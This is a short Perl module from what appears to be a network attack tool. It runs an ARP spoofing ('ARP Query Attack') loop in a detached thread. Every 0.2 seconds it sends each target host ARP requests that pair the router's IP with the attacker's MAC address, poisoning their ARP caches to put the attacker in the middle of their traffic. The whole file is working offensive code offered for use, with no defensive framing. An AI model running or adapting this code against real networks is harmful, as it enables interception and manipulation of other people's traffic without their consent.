my $arpquery_attackstatut = 1;
sub ARPQuery_Attack_Stop{
	$arpquery_attackstatut = 0;
}

sub ARPQuery_Attack_Start{
	my $ARPQueryThread = threads->new(\&ARPQuery_Attack_Thread);
    $ARPQueryThread->detach();
}

sub ARPQuery_Attack_Thread{
	my %targets = GetAttackTargets();
	my $localmac = GetLocalMac();
	my $router = GetAttackRouter();
	my $count = scalar(keys %targets);
	my $interface = GetSelectedInterface();
	AddLogInfo("[SITM] ARP Query Attack started on $count hosts !\n");
	while ($arpquery_attackstatut) {

		foreach my $k (keys(%targets)) {
		    Net::ARP::send_packet($interface,                 # Device
	            $router,          # Source IP
	            $k,          # Destination IP
	            $localmac,  # Source MAC
	            $targets{$k},  # Destinaton MAC
	            'request');             # ARP operation
		}
		Time::HiRes::sleep(0.2);
	}
}

return 1;